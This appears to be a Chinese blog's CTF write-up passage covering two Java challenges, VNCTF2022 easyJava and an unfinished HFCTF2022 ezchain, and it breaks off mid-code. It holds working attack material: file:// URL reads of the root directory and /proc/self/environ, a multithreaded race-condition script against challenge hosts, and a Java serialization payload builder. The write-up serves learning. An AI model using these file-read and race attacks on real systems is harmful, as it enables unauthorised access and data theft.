    <content type="html"><![CDATA[<p>几道java题</p><span id="more"></span><h2 id="VNCTF2022公开赛-easyJava"><a href="#VNCTF2022公开赛-easyJava" class="headerlink" title="[VNCTF2022公开赛]easyJava"></a>[VNCTF2022公开赛]easyJava</h2><p>右键看源码，提示了<code>&lt;!-- /file? --&gt;</code></p><p><code>get</code>传参<code>url</code>，比如：</p><p><code>file?url=file:///</code>显示根目录下的文件：</p><p><img src="/img/ezjava1.png" alt="ezjava1"></p><p>没法直接读<code>flag</code>，直接利用<code>file?url=file:///proc/self/environ</code>看当前工作目录：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-variable constant_">PWD</span><span class="hljs-symbol">:/usr/local/tomcat</span><br></code></pre></td></tr></table></figure><p>后面就是读响应文件了，解题需要的两个<code>class</code>文件中比较重要的部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//User.class</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> String age;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">transient</span> String height; <span class="hljs-comment">//注意height被transient修饰了</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, String age, String height)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.height = height;<br>    &#125;<br><span class="hljs-comment">//HelloWorldServlet.class</span><br><span class="hljs-meta">@WebServlet(</span><br><span class="hljs-meta">    name = &quot;HelloServlet&quot;,</span><br><span class="hljs-meta">    urlPatterns = &#123;&quot;/evi1&quot;&#125;</span><br><span class="hljs-meta">)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;m4n_q1u_666&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">String</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;666&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">String</span> <span class="hljs-variable">height</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;180&quot;</span>;<br>    User user;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HelloWorldServlet</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        <span class="hljs-built_in">this</span>.user = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-built_in">this</span>.name, <span class="hljs-built_in">this</span>.age, <span class="hljs-built_in">this</span>.height);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">reqName</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-keyword">if</span> (reqName != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-built_in">this</span>.name = reqName;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;no vnctf2022!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>                <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;The Key is &quot;</span> + Secr3t.getKey());<br>            &#125;<br><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;key&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;base64&quot;</span>);<br>        <span class="hljs-keyword">if</span> (Secr3t.getKey().equals(key) &amp;&amp; text != <span class="hljs-literal">null</span>) &#123;<br>            Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>            <span class="hljs-type">byte</span>[] textByte = decoder.decode(text);<br>            <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> (User)SerAndDe.deserialize(textByte);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.user.equals(u)) &#123;<br>                <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;Deserialize…… Flag is &quot;</span> + Secr3t.getFlag().toString());<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;KeyError&quot;</span>);<br>        &#125;<br><br>    &#125;<br>    <br><span class="hljs-comment">//check方法：</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check</span><span class="hljs-params">(String checkStr)</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;vnctf2022&quot;</span>.equals(checkStr))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>User</code>类下有三个属性：<code>name,age,height</code>。注意<code>height</code>这东西被<code>transient</code>修饰，不参与序列化。</p><p>然后<code>doGet</code>这个<code>HttpServlet</code>类中的方法存在：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>        <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;no vnctf2022!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">if</span> (Secr3t.check(<span class="hljs-built_in">this</span>.name)) &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;The Key is &quot;</span> + Secr3t.getKey());<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>一个看似有问题的逻辑，这里考点是<a href="https://y4tacker.github.io/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/">Servlet的线程安全问题</a></p><p><code>Servlet</code>类不会每次收到请求都会去实例化一次。它处理请求时是在第一次实例化一个类，当后面再次请求的时候会使用之前实例化的那个对象，也就是说相当于多个人同时操作一个对象。而这个<code>this.name</code>刚好判断的是实例化对象的属性。</p><p>这里可以用条件竞争，可以多个线程弄它：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys  <span class="hljs-comment"># 导入 sys 模块，用于与 Python 解释器进行交互，例如退出程序</span><br><span class="hljs-keyword">import</span> requests  <span class="hljs-comment"># 导入 requests 模块，用于发送 HTTP 请求</span><br><span class="hljs-keyword">import</span> threading  <span class="hljs-comment"># 导入 threading 模块，用于多线程编程</span><br><br><span class="hljs-comment"># 定义两个目标 URL</span><br>url1 = <span class="hljs-string">&#x27;http://dadf610a-208a-46ee-8b31-092008f8f6ef.node4.buuoj.cn:81/evi1?name=vnctf2022&#x27;</span><br>url2 = <span class="hljs-string">&#x27;http://dadf610a-208a-46ee-8b31-092008f8f6ef.node4.buuoj.cn:81/evi1?name=foo&#x27;</span><br><br><span class="hljs-comment"># 创建一个事件对象</span><br>event = threading.Event()<br><br><span class="hljs-comment"># 定义一个函数，接受一个参数 mode</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">go</span>(<span class="hljs-params">mode</span>):<br>    <span class="hljs-comment"># 等待事件被设置</span><br>    event.wait()<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>):  <span class="hljs-comment"># 进入一个无限循环</span><br>        <span class="hljs-keyword">try</span>:  <span class="hljs-comment"># 尝试执行以下代码块</span><br>            <span class="hljs-comment"># 发送 HTTP GET 请求</span><br>            r = requests.get(url1 <span class="hljs-keyword">if</span> mode == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> url2)<br>            <span class="hljs-comment"># 如果响应文本中包含 &#x27;The Key is &#x27;</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;The Key is &#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>                <span class="hljs-comment"># 打印响应文本</span><br>                <span class="hljs-built_in">print</span>(r.text)<br>                <span class="hljs-comment"># 退出程序，返回状态码 1</span><br>                sys.exit(<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">except</span>:  <span class="hljs-comment"># 捕获异常</span><br>            <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># 忽略异常，继续执行循环</span><br><br><span class="hljs-comment"># 如果当前脚本是主模块</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 创建 30 个线程并启动它们，每个线程都调用 go 函数，传入参数 1</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>):<br>        threading.Thread(target=go, args=(<span class="hljs-number">1</span>,)).start()<br>        <span class="hljs-comment"># 创建 30 个线程并启动它们，每个线程都调用 go 函数，传入参数 2</span><br>        threading.Thread(target=go, args=(<span class="hljs-number">2</span>,)).start()<br>    <span class="hljs-comment"># 设置事件，通知所有线程可以开始执行</span><br>    event.<span class="hljs-built_in">set</span>()<br></code></pre></td></tr></table></figure><p>也可以不这么麻烦，直接<code>a.py</code>+<code>b.py</code>同时跑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#a.py</span><br><span class="hljs-keyword">import</span> requests<br>host = <span class="hljs-string">&quot;http://ae396770-0931-4cc0-a719-448f093e1ebe.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = requests.get(host+<span class="hljs-string">&quot;evi1?name=asdqwer&quot;</span>)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;The Key is&quot;</span>)!=-<span class="hljs-number">1</span>:<br><span class="hljs-built_in">print</span>(r.text)<br><span class="hljs-keyword">if</span>(r.text.replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;&quot;</span>)!=<span class="hljs-string">&quot;&quot;</span>):<br><span class="hljs-built_in">print</span>(r.text)<br><br><span class="hljs-comment">#b.py</span><br><span class="hljs-keyword">import</span> requests<br>host = <span class="hljs-string">&quot;http://ae396770-0931-4cc0-a719-448f093e1ebe.node5.buuoj.cn:81/&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>r = requests.get(host+<span class="hljs-string">&quot;evi1?name=vnctf2022&quot;</span>)<br>r.encoding = <span class="hljs-string">&quot;utf-8&quot;</span><br><span class="hljs-keyword">if</span> r.text.find(<span class="hljs-string">&quot;The Key is&quot;</span>)!=-<span class="hljs-number">1</span>:<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>拿到<code>key</code>后就是<code>doPost</code>方法下的逻辑：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;key&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;base64&quot;</span>);<br>    <span class="hljs-keyword">if</span> (Secr3t.getKey().equals(key) &amp;&amp; text != <span class="hljs-literal">null</span>) &#123;<br>        Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>        <span class="hljs-type">byte</span>[] textByte = decoder.decode(text);<br>        <span class="hljs-type">User</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> (User)SerAndDe.deserialize(textByte);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.user.equals(u)) &#123;<br>            <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;Deserialize…… Flag is &quot;</span> + Secr3t.getFlag().toString());<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">this</span>.Response(resp, <span class="hljs-string">&quot;KeyError&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>base64</code>先解码然后反序列化，然后看结果是否等于<code>this.user</code>。但注意<code>User</code>类下<code>height被transient修饰</code>。所以需要对<code>readObject</code>进行重写，直接把这个方法加在<code>User.java</code>中就行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> java.io.IOException&#123;<br> s.defaultWriteObject();<br> <span class="hljs-comment">//强制序列化name</span><br> s.writeObject(<span class="hljs-built_in">this</span>.height);<br>&#125;<br></code></pre></td></tr></table></figure><p>EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">package</span> entity;<span class="hljs-comment">//注意这个包路径不能乱写，这也是要序列化的</span><br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;m4n_q1u_666&quot;</span>,<span class="hljs-string">&quot;666&quot;</span>,<span class="hljs-string">&quot;180&quot;</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(user);<br><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> encoder.encodeToString(bytes);<br>        System.out.println(s);<br>        <span class="hljs-comment">//rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=</span><br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以把这字符串再反序列化一下看看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> entity;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Der</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">serializedObject</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;rO0ABXNyAAtlbnRpdHkuVXNlcm1aqowD0DcIAwACTAADYWdldAASTGphdmEvbGFuZy9TdHJpbmc7TAAEbmFtZXEAfgABeHB0AAM2NjZ0AAttNG5fcTF1XzY2NnQAAzE4MHg=&quot;</span>;<br><br>        <span class="hljs-type">byte</span>[] bytes = Base64.getDecoder().decode(serializedObject);<br><br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br><br><br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> (User) objectInputStream.readObject();<br><br>        <span class="hljs-comment">// 输出反序列化后的对象信息</span><br>        System.out.println(<span class="hljs-string">&quot;Deserialized User:&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Username: &quot;</span> + user.getName());<br>        System.out.println(<span class="hljs-string">&quot;Age: &quot;</span> + user.getAge());<br>        System.out.println(<span class="hljs-string">&quot;Height: &quot;</span> + user.getHeight());<br>    &#125;<br>&#125;<br><span class="hljs-comment">//Deserialized User:</span><br><span class="hljs-comment">//Username: m4n_q1u_666</span><br><span class="hljs-comment">//Age: 666</span><br><span class="hljs-comment">//Height: 180</span><br></code></pre></td></tr></table></figure><h2 id="HFCTF2022-ezchain-未完成"><a href="#HFCTF2022-ezchain-未完成" class="headerlink" title="[HFCTF2022]ezchain(未完成)"></a>[HFCTF2022]ezchain(未完成)</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//index.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span> &#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HttpHandler</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(HttpExchange t)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            <span class="hljs-type">Map</span> <span class="hljs-variable">queryMap</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.queryToMap(t.getRequestURI().getQuery());<br>            <span class="hljs-type">String</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Welcome to HFCTF 2022&quot;</span>;<br>            <span class="hljs-keyword">if</span>(queryMap != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> (String)queryMap.get(<span class="hljs-string">&quot;token&quot;</span>);<br>                <span class="hljs-keyword">if</span>(Objects.hashCode(token) == <span class="hljs-string">&quot;HFCTF2022&quot;</span>.hashCode() &amp;&amp; !<span class="hljs-string">&quot;HFCTF2022&quot;</span>.equals(token)) &#123;<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> t.getRequestBody();<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hessian2Input</span>(is).readObject();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span>(Exception e) &#123;<br>                        response = <span class="hljs-string">&quot;oops! something is wrong&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    response = <span class="hljs-string">&quot;your token is wrong&quot;</span>;<br>                &#125;<br>            &#125;<br>            t.sendResponseHeaders(<span class="hljs-number">200</span>, ((<span class="hljs-type">long</span>)response.length()));<br>            <span class="hljs-type">OutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> t.getResponseBody();<br>            os.write(response.getBytes());<br>            os.close();<br>        &#125;<br>        <span class="hljs-keyword">public</span> Map <span class="hljs-title function_">queryToMap</span><span class="hljs-params">(String query)</span> &#123;<br>            <span class="hljs-keyword">if</span>(query == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>            &#125;<br>            <span class="hljs-type">HashMap</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>            String[] v5 = query.split(<span class="hljs-string">&quot;&amp;&quot;</span>);<br>            <span class="hljs-type">int</span> v3;<br>            <span class="hljs-keyword">for</span>(v3 = <span class="hljs-number">0</span>; v3 &lt; v5.length; ++v3) &#123;<br>                String[] entry = v5[v3].split(<span class="hljs-string">&quot;=&quot;</span>);<br>                <span class="hljs-keyword">if</span>(entry.length &gt; <span class="hljs-number">1</span>) &#123;<br>                    result.put(entry[<span class="hljs-number">0</span>], entry[<span class="hljs-number">1</span>]);<br>                &#125;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    result.put(entry[<span class="hljs-number">0</span>], <span class="hljs-string">&quot;&quot;</span>);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> result;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;server start&quot;</span>);<br>        <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> HttpServer.create(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InetSocketAddress</span>(<span class="hljs-number">8090</span>), <span class="hljs-number">0</span>);<br>        server.createContext(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyHandler</span>());<br>        